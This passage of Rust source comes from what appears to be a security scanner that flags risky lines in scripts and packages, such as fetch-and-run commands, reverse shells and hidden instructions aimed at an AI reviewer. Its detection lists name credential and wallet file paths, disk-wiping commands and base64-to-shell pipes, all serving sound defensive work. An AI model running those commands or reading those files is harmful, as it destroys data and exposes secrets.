//! Local, line-oriented heuristics.
//!
//! Every rule is a `RuleId` variant with a `Matcher`, so adding a rule without
//! deciding how it matches is a compile error rather than a silent miss.

use std::net::IpAddr;
use std::path::Path;

use crate::report::Severity;

pub mod addressed;
pub mod encoded;
pub mod exfil;
pub mod fetch;
pub mod flow;
pub mod hidden;
pub mod hosts;
pub mod persist;
pub mod shell;

use shell::{
    PIPE_SHELLS, program_name, shell_words, short_flag, unquoted, unquoted_words, unversioned,
};

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum RuleId {
    DownloadAndExecute,
    EncodedCommandExecution,
    CredentialFileAccess,
    DestructiveSystemOperation,
    PersistenceModification,
    ShellCommandExecution,
    PrivilegeEscalation,
    CredentialExfiltration,
    CleartextNetworkRequest,
    DirectIpNetworkRequest,
    DisabledTlsVerification,
    GitConfigCommand,
    SshCommand,
    ModifiedPackageFile,
    HiddenProgram,
    RunningFromTemp,
    PreloadedLibrary,
    KeyboardReader,
    UnknownKernelModule,
    UnknownPrivilegedFile,
    NetworkListener,
    ReviewerInstruction,
    ReorderedText,
    InvisibleText,
    HiddenCharacter,
    LookalikeHost,
    DataDropHost,
    RemoteShell,
    CryptoMiner,
    ProtectionDisabled,
    TraceRemoval,
    GuardianOverride,
    PathHijack,
    NewTrust,
    PrivilegedAccount,
    BootTampering,
    RiskyConfiguration,
    UnexpectedCapability,
    NetworkRelay,
    RootkitSign,
    TracedProcess,
    TracedSecrets,
    KernelTap,
    KeptFromReview,
    RemoteCodeInstall,
}

/// How a rule decides whether a lowercased line matches.
enum Matcher {
    /// Any of these patterns, respecting identifier boundaries (see
    /// `contains_pattern`).
    Patterns(&'static [&'static str]),
    Custom(fn(&str) -> bool),
    /// Reported by a dedicated check (the network destination inventory, the
    /// git config check) instead of per line.
    Reported,
}

const CREDENTIAL_FILES: &[&str] = &[
    ".ssh/id_rsa",
    ".ssh/id_ed25519",
    ".ssh/id_ecdsa",
    ".ssh/id_dsa",
    ".gnupg/",
    ".password-store",
    ".netrc",
    ".git-credentials",
    ".local/share/opencode/auth.json",
    ".claude/.credentials.json",
    "logins.json",
    "key4.db",
    ".aws/credentials",
    ".config/gcloud/credentials.db",
    "/etc/shadow",
    "login data",
    "cookies.sqlite",
    // Credential stores of common tools and browsers, and wallet files.
    // `.gnupg/` (with the slash) is above; the bare directory name is left
    // out, since gpg's own tooling mentions it constantly.
    ".config/gh/hosts.yml",
    ".docker/config.json",
    ".kube/config",
    ".config/gcloud",
    ".cargo/credentials",
    ".local/share/keyrings",
    ".config/solana/id.json",
    ".electrum/wallets",
    ".ethereum/keystore",
    ".bitcoin/wallet",
    "/proc/self/environ",
    // Commands that read a secret out of a store or the clipboard.
    "secret-tool lookup",
    "pass show",
    "gpg --export-secret-keys",
    "security find-generic-password",
];

const ENCODED_PIPES: &[&str] = &[
    "base64 -d | sh",
    "base64 --decode | sh",
    "base64 -d | bash",
    "base64 --decode | bash",
];

const DESTRUCTIVE_COMMANDS: &[&str] = &[
    "shred /dev/",
    "dd if=/dev/zero of=/dev/",
    "dd if=/dev/urandom of=/dev/",
    "--no-preserve-root",
    "wipefs -a",
    "wipefs --all",
    "blkdiscard /dev/",
    "find / -delete",
    "cryptsetup luksformat",
    "cryptsetup erase",
    "cryptsetup lukserase",
    "sgdisk --zap-all",
    "sgdisk -z",
];

const PERSISTENCE_PATHS: &[&str] = &[
    ".config/autostart/",
    ".config/systemd/user/",
    ".config/environment.d/",
    "/etc/systemd/system/",
    "/etc/cron.",
    "/etc/rc.local",
    "/etc/ld.so.preload",
    "/etc/profile.d/",
    "crontab -",
    ".ssh/authorized_keys",
    ".bashrc",
    ".zshrc",
    "~/.profile",
    "$home/.profile",
    "${home}/.profile",
    ".bash_profile",
    ".zprofile",
    ".config/fish/config.fish",
    ".config/omarchy/hooks/",
    "/etc/xdg/autostart/",
    "/etc/udev/rules.d/",
    "exec-once",
    "/library/launchagents/",
    "currentversion\\run",
];

const SHELL_EXECUTION: &[&str] = &[
    "os.system(",
    "os.execute(",
    "io.popen(",
    "subprocess.popen(",
    "subprocess.run(",
    "child_process.exec(",
    "child_process.execsync(",
    "command::new(\"sh\")",
    "command::new(\"bash\")",
    "eval(",
    "os.popen(",
    "subprocess.call(",
    "subprocess.check_call(",
    "subprocess.check_output(",
    "__import__('os').system(",
    "__import__(\"os\").system(",
    "child_process').exec(",
    "child_process\").exec(",
];

const PRIVILEGE_ESCALATION: &[&str] = &[
    "sudo ",
    "doas ",
    "run0 ",
    "pkexec ",
    "setuid(",
    "chmod u+s",
    "chmod 4755",
    "chmod 6755",
    "chmod +s",
    "install -m4755",
    "install -m 4755",
    "install -dm4755",
    "setcap ",
    "cap_set_file",
    "/etc/sudoers",
    "usermod -ag",
    "chown root",
];

impl RuleId {
    pub const ALL: [Self; 45] = [
        Self::DownloadAndExecute,
        Self::EncodedCommandExecution,
        Self::CredentialFileAccess,
        Self::DestructiveSystemOperation,
        Self::PersistenceModification,
        Self::ShellCommandExecution,
        Self::PrivilegeEscalation,
        Self::CredentialExfiltration,
        Self::CleartextNetworkRequest,
        Self::DirectIpNetworkRequest,
        Self::DisabledTlsVerification,
        Self::GitConfigCommand,
        Self::SshCommand,
        Self::ModifiedPackageFile,
        Self::HiddenProgram,
        Self::RunningFromTemp,
        Self::PreloadedLibrary,
        Self::KeyboardReader,
        Self::UnknownKernelModule,
        Self::UnknownPrivilegedFile,
        Self::NetworkListener,
        Self::ReviewerInstruction,
        Self::ReorderedText,
        Self::InvisibleText,
        Self::HiddenCharacter,
        Self::LookalikeHost,
        Self::DataDropHost,
        Self::RemoteShell,
        Self::CryptoMiner,
        Self::ProtectionDisabled,
        Self::TraceRemoval,
        Self::GuardianOverride,
        Self::PathHijack,
        Self::NewTrust,
        Self::PrivilegedAccount,
        Self::BootTampering,
        Self::RiskyConfiguration,
        Self::UnexpectedCapability,
        Self::NetworkRelay,
        Self::RootkitSign,
        Self::TracedProcess,
        Self::TracedSecrets,
        Self::KernelTap,
        Self::KeptFromReview,
        Self::RemoteCodeInstall,
    ];

    pub fn from_name(name: &str) -> Option<Self> {
        Self::ALL.into_iter().find(|rule| rule.name() == name)
    }

    pub const fn name(self) -> &'static str {
        match self {
            Self::DownloadAndExecute => "download-and-execute",
            Self::EncodedCommandExecution => "encoded-command-execution",
            Self::CredentialFileAccess => "credential-file-access",
            Self::DestructiveSystemOperation => "destructive-system-operation",
            Self::PersistenceModification => "persistence-modification",
            Self::ShellCommandExecution => "shell-command-execution",
            Self::PrivilegeEscalation => "privilege-escalation",
            Self::CredentialExfiltration => "credential-exfiltration",
            Self::CleartextNetworkRequest => "cleartext-network-request",
            Self::DirectIpNetworkRequest => "direct-ip-network-request",
            Self::DisabledTlsVerification => "disabled-tls-verification",
            Self::GitConfigCommand => "git-config-command",
            Self::SshCommand => "ssh-command",
            Self::ModifiedPackageFile => "modified-package-file",
            Self::HiddenProgram => "hidden-program",
            Self::RunningFromTemp => "running-from-temp",
            Self::PreloadedLibrary => "preloaded-library",
            Self::KeyboardReader => "keyboard-reader",
            Self::UnknownKernelModule => "unknown-kernel-module",
            Self::UnknownPrivilegedFile => "unknown-privileged-file",
            Self::NetworkListener => "network-listener",
            Self::ReviewerInstruction => "text-addressed-to-reviewer",
            Self::ReorderedText => "reordered-text",
            Self::InvisibleText => "invisible-text",
            Self::HiddenCharacter => "hidden-character",
            Self::LookalikeHost => "lookalike-host",
            Self::DataDropHost => "data-drop-host",
            Self::RemoteShell => "remote-shell",
            Self::CryptoMiner => "crypto-miner",
            Self::ProtectionDisabled => "protection-disabled",
            Self::TraceRemoval => "trace-removal",
            Self::GuardianOverride => "guardian-override",
            Self::PathHijack => "path-hijack",
            Self::NewTrust => "new-trust",
            Self::PrivilegedAccount => "privileged-account",
            Self::BootTampering => "boot-tampering",
            Self::RiskyConfiguration => "risky-configuration",
            Self::UnexpectedCapability => "unexpected-capability",
            Self::NetworkRelay => "network-relay",
            Self::RootkitSign => "rootkit-sign",
            Self::TracedProcess => "traced-process",
            Self::TracedSecrets => "traced-secrets",
            Self::KernelTap => "kernel-tap",
            Self::KeptFromReview => "kept-from-review",
            Self::RemoteCodeInstall => "remote-code-install",
        }
    }

    pub const fn severity(self) -> Severity {
        match self {
            Self::DownloadAndExecute
            | Self::EncodedCommandExecution
            | Self::DestructiveSystemOperation
            | Self::CredentialExfiltration
            | Self::ModifiedPackageFile
            | Self::HiddenProgram
            | Self::PreloadedLibrary
            | Self::UnknownKernelModule
            | Self::UnknownPrivilegedFile
            | Self::ReviewerInstruction
            | Self::ReorderedText
            | Self::InvisibleText
            | Self::RemoteShell
            | Self::CryptoMiner
            | Self::ProtectionDisabled
            | Self::GuardianOverride
            | Self::PathHijack
            | Self::NewTrust
            | Self::PrivilegedAccount
            | Self::BootTampering
            | Self::RootkitSign
            | Self::TracedSecrets => Severity::High,
            Self::NetworkListener => Severity::Low,
            Self::CredentialFileAccess
            | Self::PersistenceModification
            | Self::ShellCommandExecution
            | Self::PrivilegeEscalation
            | Self::CleartextNetworkRequest
            | Self::DirectIpNetworkRequest
            | Self::DisabledTlsVerification
            | Self::GitConfigCommand
            | Self::SshCommand
            | Self::RunningFromTemp
            | Self::KeyboardReader
            | Self::HiddenCharacter
            | Self::LookalikeHost
            | Self::DataDropHost
            | Self::TraceRemoval
            | Self::RiskyConfiguration
            | Self::UnexpectedCapability
            | Self::NetworkRelay
            | Self::TracedProcess
            | Self::KernelTap
            | Self::KeptFromReview
            | Self::RemoteCodeInstall => Severity::Medium,
        }
    }

    /// What each rule reports, in the order of `ALL`. A table rather than a
    /// match so that it stays one item however many rules there are; the
    /// test below holds it to `ALL`.
    const DESCRIPTIONS: [(Self, &'static str); 45] = [
        (
            Self::DownloadAndExecute,
            "Fetches code from the network and runs it without it being reviewed: piped into a shell or an interpreter, run from a substitution, or saved and then run.",
        ),
        (
            Self::EncodedCommandExecution,
            "Encoded or dynamically evaluated data appears to be executed as a command.",
        ),
        (
            Self::CredentialFileAccess,
            "References a commonly sensitive credential or private-key file; inspect how it is used.",
        ),
        (
            Self::DestructiveSystemOperation,
            "Contains a command associated with destructive disk or filesystem changes.",
        ),
        (
            Self::PersistenceModification,
            "May install persistence: writes a startup, scheduled-task or SSH authorization file, runs a command on its own from a temporary or cache directory, or arranges for something to keep running.",
        ),
        (
            Self::ShellCommandExecution,
            "Starts a shell or dynamically evaluates a command; review how input is constructed.",
        ),
        (
            Self::PrivilegeEscalation,
            "Requests elevated privileges or changes privilege-related system configuration.",
        ),
        (
            Self::CredentialExfiltration,
            "Combines access to sensitive data with an outbound network request.",
        ),
        (
            Self::CleartextNetworkRequest,
            "Sends a network request over unencrypted HTTP.",
        ),
        (
            Self::DirectIpNetworkRequest,
            "Sends a request to a hard-coded IP address instead of a named host.",
        ),
        (
            Self::DisabledTlsVerification,
            "Disables TLS certificate verification for network requests.",
        ),
        (
            Self::GitConfigCommand,
            "A git config in the tree names a command git runs, or another address for git to fetch from, on later commands here (status, describe, diff, fetch).",
        ),
        (
            Self::SshCommand,
            "An SSH file runs a command or loads a library (a ProxyCommand, a Match exec, a provider library), or a key carries a command= or environment= option.",
        ),
        (
            Self::ModifiedPackageFile,
            "A file a package installed has been changed since; it is not what the package shipped.",
        ),
        (
            Self::HiddenProgram,
            "A running program has no file on disk: it was deleted, or lives only in memory.",
        ),
        (
            Self::RunningFromTemp,
            "A program runs from a temporary or cache directory, where downloads land.",
        ),
        (
            Self::PreloadedLibrary,
            "A library no package installed is preloaded into a running program (LD_PRELOAD).",
        ),
        (
            Self::KeyboardReader,
            "A program no package installed reads the keyboard device directly.",
        ),
        (
            Self::UnknownKernelModule,
            "A loaded kernel module was not installed by a package.",
        ),
        (
            Self::UnknownPrivilegedFile,
            "A file no package vouches for runs with extra rights (setuid, setgid or capabilities).",
        ),
        (
            Self::NetworkListener,
            "A program listens on the network that nothing installed accounts for: an interpreter (Python, a shell, Node), or a packaged program no packaged service runs.",
        ),
        (
            Self::ReviewerInstruction,
            "Text addressed to a reviewer or an AI model, telling it what to conclude; software has no reason to carry it.",
        ),
        (
            Self::ReorderedText,
            "Holds bidirectional control characters: the text is shown in another order than it is read by a compiler, a shell or the AI review.",
        ),
        (
            Self::InvisibleText,
            "Holds Unicode tag characters: text no person sees, which an AI model reads as instructions.",
        ),
        (
            Self::HiddenCharacter,
            "An invisible character sits inside a name, a command or a path: it is not the name it reads as, to a person or to the AI review.",
        ),
        (
            Self::LookalikeHost,
            "A host name mixes alphabets, in letters or in the punycode that spells them, or begins with a well-known host's name but belongs to another domain, so it can read as another name than the one requested.",
        ),
        (
            Self::DataDropHost,
            "Sends to or fetches from a host commonly used to deliver or receive stolen data (a paste site, a chat webhook, a tunnel, a link shortener).",
        ),
        (
            Self::RemoteShell,
            "A shell is connected to the network, so someone elsewhere types the commands (a reverse or bind shell): in code that sets one up, or in a running shell or interpreter with a network socket for its input and output.",
        ),
        (
            Self::CryptoMiner,
            "Names a cryptocurrency miner, a mining pool or a mining protocol.",
        ),
        (
            Self::ProtectionDisabled,
            "Turns off a protection of this system: a firewall, a security service, or Guardian's own gates.",
        ),
        (
            Self::TraceRemoval,
            "Erases shell history or system logs, which is how traces of other commands are removed.",
        ),
        (
            Self::GuardianOverride,
            "A unit file or drop-in changes what Guardian's own sweep runs; allowing the file does not quiet this.",
        ),
        (
            Self::PathHijack,
            "A program or directory a user can write comes ahead of the system's own on PATH and takes over a command's name.",
        ),
        (
            Self::NewTrust,
            "Something that was not there at the last sweep may now log in, administer or vouch here: an account, a member of an administrator group, an SSH key or a certificate authority.",
        ),
        (
            Self::PrivilegedAccount,
            "An account has rights no ordinary system gives it: a second account with user id 0, or a system account someone can log in to.",
        ),
        (
            Self::BootTampering,
            "The running kernel was started with a parameter that turns off a defence or replaces init and that the reviewed boot configuration does not hold, or a kernel image in /boot is not the one its package ships.",
        ),
        (
            Self::RiskyConfiguration,
            "A configuration file redirects where programs, packages or web pages come from, or loads code into a program at every start.",
        ),
        (
            Self::UnexpectedCapability,
            "A packaged program holds file capabilities its package does not set (pacman does not record them, so the file itself is unchanged).",
        ),
        (
            Self::NetworkRelay,
            "A tool that runs or forwards what it is told over the network (netcat, socat, a tunnel) listens or is connected.",
        ),
        (
            Self::RootkitSign,
            "The kernel's own lists disagree (a process, module or socket that exists is not listed), or a program wears a kernel thread's name: what something hiding itself looks like.",
        ),
        (
            Self::TracedProcess,
            "Another process is attached to this one the way a debugger is, and can read and change its memory.",
        ),
        (
            Self::TracedSecrets,
            "A process is attached, the way a debugger is, to a program that holds secrets (a shell, SSH, sudo, a key agent, a browser, a password manager).",
        ),
        (
            Self::KernelTap,
            "Something no package explains taps the kernel's network or tracing path: a raw packet socket, or a pinned eBPF object.",
        ),
        (
            Self::KeptFromReview,
            "Something runs this file, or a shell reads it in, and it holds more than opaque values kept in secret-named or plainly inert variables; its path marks it as holding secrets, so the AI review did not read it: only the local rules did. Read it yourself; `sweep allow` records that you did.",
        ),
        (
            Self::RemoteCodeInstall,
            "Installs and runs code from an address, not from this source: a package manager is given a URL or a repository, or told to fetch and run a package at whatever its newest version is.",
        ),
    ];

    pub const fn description(self) -> &'static str {
        let mut index = 0;
        while index < Self::DESCRIPTIONS.len() {
            if Self::DESCRIPTIONS[index].0 as usize == self as usize {
                return Self::DESCRIPTIONS[index].1;
            }
            index += 1;
        }
        ""
    }

    const fn matcher(self) -> Matcher {
        match self {
            Self::DownloadAndExecute => Matcher::Custom(is_download_piped_to_shell),
            Self::EncodedCommandExecution => Matcher::Custom(is_encoded_command_execution),
            Self::CredentialFileAccess => Matcher::Custom(references_credential),
            Self::DestructiveSystemOperation => Matcher::Custom(is_destructive_operation),
            Self::PersistenceModification => Matcher::Custom(is_persistence),
            Self::ShellCommandExecution => Matcher::Patterns(SHELL_EXECUTION),
            Self::PrivilegeEscalation => Matcher::Custom(is_privilege_escalation),
            Self::CredentialExfiltration => Matcher::Custom(looks_like_credential_exfiltration),
            Self::CleartextNetworkRequest
            | Self::DirectIpNetworkRequest
            | Self::GitConfigCommand
            | Self::SshCommand
            | Self::ModifiedPackageFile
            | Self::HiddenProgram
            | Self::RunningFromTemp
            | Self::PreloadedLibrary
            | Self::KeyboardReader
            | Self::UnknownKernelModule
            | Self::UnknownPrivilegedFile
            | Self::NetworkListener
            | Self::ReviewerInstruction
            | Self::ReorderedText
            | Self::InvisibleText
            | Self::HiddenCharacter
            | Self::LookalikeHost
            | Self::DataDropHost
            | Self::GuardianOverride
            | Self::PathHijack
            | Self::NewTrust
            | Self::PrivilegedAccount
            | Self::BootTampering
            | Self::RiskyConfiguration
            | Self::UnexpectedCapability
            | Self::NetworkRelay
            | Self::RootkitSign
            | Self::TracedProcess
            | Self::TracedSecrets
            | Self::KernelTap
            | Self::KeptFromReview => Matcher::Reported,
            Self::DisabledTlsVerification => Matcher::Custom(disables_tls_verification),
            Self::RemoteShell => Matcher::Custom(is_remote_shell),
            Self::CryptoMiner => Matcher::Custom(is_crypto_mining),
            Self::ProtectionDisabled => Matcher::Custom(disables_protection),
            Self::TraceRemoval => Matcher::Custom(removes_traces),
            Self::RemoteCodeInstall => Matcher::Custom(fetch::installs_remote_code),
        }
    }

    /// Context rules that describe something a script might do, which
    /// install notes routinely tell the user to do by hand (`sudo systemctl
    /// enable ...`, `add this to ~/.bashrc`). They skip text a script only
    /// prints. The rules for directly dangerous commands still match printed
    /// text, so a message cannot hide one.
    pub const fn ignores_messages(self) -> bool {
        match self {
            Self::CredentialFileAccess
            | Self::PersistenceModification
            | Self::PrivilegeEscalation
            | Self::CleartextNetworkRequest
            | Self::DirectIpNetworkRequest
            | Self::DisabledTlsVerification
            | Self::LookalikeHost
            | Self::DataDropHost
            | Self::ProtectionDisabled
            | Self::TraceRemoval
            | Self::RemoteCodeInstall => true,
            Self::DownloadAndExecute
            | Self::EncodedCommandExecution
            | Self::DestructiveSystemOperation
            | Self::ShellCommandExecution
            | Self::CredentialExfiltration
            | Self::GitConfigCommand
            | Self::SshCommand
            | Self::ModifiedPackageFile
            | Self::HiddenProgram
            | Self::RunningFromTemp
            | Self::PreloadedLibrary
            | Self::KeyboardReader
            | Self::UnknownKernelModule
            | Self::UnknownPrivilegedFile
            | Self::NetworkListener
            | Self::ReviewerInstruction
            | Self::ReorderedText
            | Self::InvisibleText
            | Self::HiddenCharacter
            | Self::RemoteShell
            | Self::CryptoMiner
            | Self::GuardianOverride
            | Self::PathHijack
            | Self::NewTrust
            | Self::PrivilegedAccount
            | Self::BootTampering
            | Self::RiskyConfiguration
            | Self::UnexpectedCapability
            | Self::NetworkRelay
            | Self::RootkitSign
            | Self::TracedProcess
            | Self::TracedSecrets
            | Self::KernelTap
            | Self::KeptFromReview => false,
        }
    }

    fn matches_line(self, lowered: &str) -> bool {
        match self.matcher() {
            Matcher::Patterns(patterns) => contains_any(lowered, patterns),
            Matcher::Custom(matches) => matches(lowered),
            Matcher::Reported => false,
        }
    }
}

/// The line rules matched by one lowercased line: `code` with comments
/// blanked, `quiet` with printed messages blanked as well (see `mask`).
pub fn line_rules<'a>(code: &'a str, quiet: &'a str) -> impl Iterator<Item = RuleId> + 'a {
    RuleId::ALL
        .into_iter()
        .filter(move |rule| rule.matches_line(if rule.ignores_messages() { quiet } else { code }))
}

fn is_identifier_byte(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || byte == b'_'
}

/// Finds `pattern` in `haystack`. A pattern that starts with an identifier
/// character must not continue an identifier or member access, so `eval(`
/// matches `eval(x)` but not `retrieval(x)` or `model.eval()`.
fn contains_pattern(haystack: &str, pattern: &str) -> bool {
    pattern_starts(haystack, pattern).next().is_some()
}

/// Where `pattern` occurs in `haystack`, respecting identifier boundaries.
fn pattern_starts<'a>(haystack: &'a str, pattern: &'a str) -> impl Iterator<Item = usize> + 'a {
    let needs_boundary = pattern.bytes().next().is_some_and(is_identifier_byte);
    haystack
        .match_indices(pattern)
        .map(|(start, _)| start)
        .filter(move |start| {
            !needs_boundary
                || haystack.as_bytes()[..*start]
                    .last()
                    .is_none_or(|previous| !is_identifier_byte(*previous) && *previous != b'.')
        })
}

/// A persistence path (see `names_persistence_path`), or one of the other
/// ways of persisting that `persist` reads.
fn is_persistence(line: &str) -> bool {
    names_persistence_path(line) || persist::matches(line)
}

/// A persistence path, unless it is a file a PKGBUILD puts in the package
/// (`"$pkgdir"/etc/profile.d/x.sh`): pacman installs it as a listed package
/// file, just like a unit under `/usr/lib/systemd/system`.
fn names_persistence_path(line: &str) -> bool {
    PERSISTENCE_PATHS.iter().any(|pattern| {
        pattern_starts(line, pattern).any(|start| {
            let before = &line[..start];
            // The last word; `rsplit` cuts after the whole whitespace
            // character, which may be longer than one byte.
            let word = before
                .rsplit(char::is_whitespace)
                .next()
                .unwrap_or(before)
                .trim_start_matches(['>', '<', '"', '\'', '(']);
            let rest = line[start..]
                .split(char::is_whitespace)
                .next()
                .unwrap_or_default();
            !is_packaged_path(word) || rest.contains("..")
        })
    })
}

/// Whether `word` is a path, or the start of one, inside the package a
/// PKGBUILD assembles: it begins with `$pkgdir` and never climbs out of it
/// with `..`.
fn is_packaged_path(word: &str) -> bool {
    // `."."` and `.\.` are `..` to the shell.
    let plain: String = word
        .chars()
        .filter(|character| !matches!(character, '"' | '\'' | '\\'))
        .collect();
    is_pkgdir_prefix(word) && !plain.contains("..")
}

/// `$pkgdir` or `${pkgdir}` as a whole word, possibly quoted: `$pkgdirz`
/// is another (empty) variable, so it does not count.
fn is_pkgdir_prefix(word: &str) -> bool {
    let rest = word
        .strip_prefix("${pkgdir}")
        .or_else(|| word.strip_prefix("$pkgdir"));
    rest.is_some_and(|rest| {
        rest.chars()
            .next()
            .is_none_or(|next| !(next.is_ascii_alphanumeric() || next == '_'))
    })
}

fn contains_any(haystack: &str, patterns: &[&str]) -> bool {
    patterns
        .iter()
        .any(|pattern| contains_pattern(haystack, pattern))
}

/// Programs that fetch from the network.
const FETCHERS: &[&str] = &["curl", "wget", "aria2c"];

pub fn is_download_piped_to_shell(line: &str) -> bool {
    is_fetch_piped_to_shell(line) || fetch::matches(line)
}

/// curl, wget or aria2c piped into a shell or run from a substitution.
fn is_fetch_piped_to_shell(line: &str) -> bool {
    // Bash's own network redirection: a reverse shell or a fetch without
    // any fetcher.
    if line.contains("/dev/tcp/") || line.contains("/dev/udp/") {
        return true;
    }
    if !FETCHERS.iter().any(|fetcher| line.contains(fetcher)) {
        return false;
    }
    pipes_into_shell(line, |segment| {
        FETCHERS
            .iter()
            .any(|fetcher| contains_pattern(segment, fetcher))
    }) || runs_fetched_text(line)
}

/// Whether the command on `line` goes on in `next`: a trailing backslash,
/// pipe or `&&`, or a pipe opening the next line.
pub fn continues(line: &str, next: &str) -> bool {
    let line = line.trim_end();
    line.ends_with('\\')
        || line.ends_with('|')
        || line.ends_with("&&")
        || next.trim_start().starts_with('|')
}

/// What runs a file given to it.
const RUNNERS: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "ash", "fish", "source", ".", "python", "perl", "node",
    "ruby", "php", "lua",
];

/// A file name as written, without a leading `./`.
fn as_file(word: &str) -> Option<String> {
    let name = word.trim_end_matches(';').trim_start_matches("./");
    (!name.is_empty()).then(|| name.to_string())
}

/// The file a fetch on `line` is saved as: `curl -o x`, `wget -O x`,
/// `curl … > x`, or the name in the address for `wget` and `curl -O`.
pub fn fetched_file(line: &str) -> Option<String> {
    let words = unquoted_words(line);
    let at = words
        .iter()
        .position(|word| FETCHERS.contains(&program_name(word)))?;
    let fetcher = program_name(&words[at]);
    let mut by_address = fetcher == "wget";
    let mut address = None;
    let mut rest = words[at + 1..].iter();
    while let Some(word) = rest.next() {
        match word.as_str() {
            ";" | "&&" | "||" | "|" => break,
            "-O" | "--remote-name" if fetcher == "curl" => by_address = true,
            // wget's `-o` names its log.
            "-o" if fetcher == "wget" => {
                rest.next();
            }
            ">" | ">>" => return rest.next().and_then(|name| as_file(name)),
            "-o" | "-O" | "--output" | "--output-document" | "--out" => {
                match rest.next().map(String::as_str) {
                    // Standard output: only a redirection saves it.
                    Some("-") => by_address = false,
                    name => return name.and_then(as_file),
                }
            }
            _ if fetcher == "wget"
                && word.starts_with('-')
                && !word.starts_with("--")
                && word.ends_with("O-") =>
            {
                by_address = false;
            }
            // Short options given together: `-fsSLo x`, `-qO x`.
            _ if word.len() > 2
                && word.starts_with('-')
                && !word.starts_with("--")
                && word.ends_with(['o', 'O'])
                && !(fetcher == "wget" && word.ends_with('o')) =>
            {
                if word.ends_with('O') && fetcher == "curl" {
                    by_address = true;
                } else {
                    match rest.next().map(String::as_str) {
                        Some("-") => by_address = false,
                        name => return name.and_then(as_file),
                    }
                }
            }
            _ => {
                if let Some(name) = [">>", ">"]
                    .iter()
                    .find_map(|option| word.strip_prefix(option))
                {
                    return as_file(name);
                }
                match ["--output=", "--output-document=", "--out="]
                    .iter()
                    .find_map(|option| word.strip_prefix(option))
                {
                    Some("-") => by_address = false,
                    Some(name) => return as_file(name),
                    None => {}
                }
                if word.contains("://") {
                    address = Some(word);
                }
            }
        }
    }
    let address = address.filter(|_| by_address)?;
    let path = address.split(['?', '#']).next().unwrap_or_default();
    as_file(program_name(path.trim_end_matches(';')))
}

/// Every file a fetch on `line` is saved as: what `fetched_file` names,
/// and what `fetch::saved_files` adds (through `tee`, into a directory, by
/// another fetcher).
pub fn fetched_files(line: &str) -> Vec<String> {
    let mut found: Vec<String> = fetched_file(line).into_iter().collect();
    for file in fetch::saved_files(line) {
        if !found.contains(&file) {
            found.push(file);
        }
    }
    found
}

/// A word without the `)` that closes the group it stands last in:
/// `(sh x)`. A word with a parenthesis of its own is left as it is, and
/// so is one that is nothing else.
fn without_group_close(word: &str) -> &str {
    let bare = word.trim_end_matches(')');
    if word.contains('(') || bare.is_empty() {
        word
    } else {
        bare
    }
}

/// The command one statement, or one part of a pipeline, runs, for
/// `runs_file` and `run_targets`. What stands before the program is read
/// by `shell::command`: wrappers (`sudo -u x`, `nohup`, `timeout 5`),
/// assignments (`X=1`) and what opens a group or a block. A command as a
/// configuration's value (`exec = sh x`) is read from after the key.
fn run_command(part: &str) -> Option<shell::Command> {
    let words = shell_words(part);
    if words.get(1).is_some_and(|word| word == "=") {
        return shell::command(&words[2..].join(" "));
    }
    shell::command(part)
}

/// The command `part` runs when it is a setting whose value begins with a
/// path: `ExecStart=/bin/sh x`. To a shell the same words run `x` with a
/// variable set, so this is a second reading, not the first.
fn value_command(part: &str) -> Option<shell::Command> {
    let words = shell_words(part);
    let (key, value) = words.first()?.split_once('=')?;
    // A unit file writes marks before the program: `ExecStart=-/bin/sh x`.
    let value = value.trim_start_matches(['-', '@', '+', '!', ':', '|']);
    if key.is_empty() || key.contains(['/', '"', '\'', '$']) || !unquoted(value).starts_with('/') {
        return None;
    }
    let rest = [&[value.to_string()], &words[1..]].concat().join(" ");
    shell::command(&rest)
}

/// Whether `line` runs the file named `file`: given to a shell or an
/// interpreter, sourced, or run by its path (see `run_command`).
pub fn runs_file(line: &str, file: &str) -> bool {
    // Inside a group a word is written with the group's `)`: the file as
    // it was saved, and the word that names it.
    let is_named = |word: &str| {
        as_file(word.trim_start_matches('<')).is_some_and(|name| {
            name == file || without_group_close(&name) == without_group_close(file)
        })
    };
    let names_it = |statement: &str| unquoted_words(statement).iter().any(|word| is_named(word));
    // `cat x | sh`.
    if pipes_into_shell(line, names_it) {
        return true;
    }
    let line = line.replace("&&", ";").replace("||", ";");
    line.split([';', '|']).any(|statement| {
        [run_command(statement), value_command(statement)]
            .into_iter()
            .flatten()
            .any(|command| runs_named(&command, &is_named))
    })
}

/// Whether `command` runs a file `is_named` knows: by its path, or as what
/// a shell or an interpreter is given.
fn runs_named(command: &shell::Command, is_named: &dyn Fn(&str) -> bool) -> bool {
    let program = command.path.as_str();
    if (program.contains('/') || program.starts_with('$')) && is_named(program) {
        return true;
    }
    let name = command.program.as_str();
    let unversioned = unversioned(name);
    // Only parsed or compiled: `sh -n`, `node --check`, `python -m`.
    let only_checks = command
        .arguments
        .iter()
        .take_while(|word| word.starts_with('-'))
        .any(|word| match word.as_str() {
            "-n" => PIPE_SHELLS.contains(&unversioned),
            "-m" => unversioned == "python",
            "--check" => unversioned == "node",
            _ => false,
        });
    (RUNNERS.contains(&name) || (!unversioned.is_empty() && RUNNERS.contains(&unversioned)))
        && !only_checks
        && command.arguments.iter().any(|word| is_named(word))
}

/// The files `line` runs or reads in as code, as written: what it gives a
/// shell or an interpreter (`sh x`, `. ./x`, `python3 x.py`, `sh <x`),
/// what it runs by its path (`./x`, `/opt/x`), and what it pipes into a
/// shell (`cat x | sh`). The program is found as in `runs_file`.
pub fn run_targets(line: &str) -> Vec<String> {
    let mut found: Vec<String> = Vec::new();
    // A word that ends in `)` is a file in a group that closes there, or
    // a file of that name: both are named, and a name no file has is
    // nobody's.
    let mut add = |word: &str| {
        let word = word.trim_start_matches('<');
        for word in [without_group_close(word), word] {
            if let Some(name) = as_file(word)
                && !name.starts_with('-')
                && !found.contains(&name)
            {
                found.push(name);
            }
        }
    };
    let flat = line.replace("&&", ";").replace("||", ";");
    for (index, statement) in flat.split(';').enumerate() {
        if index >= MAX_STATEMENTS {
            break;
        }
        // Each segment's command, read once.
        let commands: Vec<Option<shell::Command>> = statement
            .split('|')
            .take(MAX_SEGMENTS)
            .map(run_command)
            .collect();
        // Whether a shell reads what comes after each segment, worked out
        // once from the end.
        let mut shell_after = vec![false; commands.len() + 1];
        for at in (0..commands.len()).rev() {
            let is_shell = commands[at].as_ref().is_some_and(shell::Command::is_shell);
            shell_after[at] = shell_after[at + 1] || is_shell;
        }
        for (at, command) in commands.iter().enumerate() {
